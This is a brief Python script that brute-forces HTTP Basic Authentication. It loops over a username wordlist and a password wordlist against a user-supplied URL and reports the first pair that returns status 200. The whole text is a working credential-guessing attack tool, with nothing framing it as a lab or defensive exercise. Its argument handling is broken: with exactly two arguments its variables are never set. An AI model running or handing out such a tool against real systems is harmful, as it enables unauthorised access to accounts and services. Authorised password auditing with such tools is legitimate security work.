from sys import argv
from requests.auth import HTTPBasicAuth
import requests
import base64

if len(argv) != 3:
	URL = input('Insert URL: ')
	fileUsers = input('Insert UserName File: ')
	filePaswd = input('Insert password File: ')
#print(URL +" "+ fileUsers + " "+filePaswd)
userList = open(fileUsers, "r")
paswdList = open(filePaswd, "r")
users = userList.readlines()
passwords = paswdList.readlines()

for user in users :
	for paswd in passwords :
		req = requests.get(URL, auth=HTTPBasicAuth(user.strip('\n'), paswd.strip('\n')))
		print(req.status_code)
		if req.status_code == 200 :
		  	print ("user: " + user + " password: " + paswd)
		  	exit(0)
print("NOT FOUND")
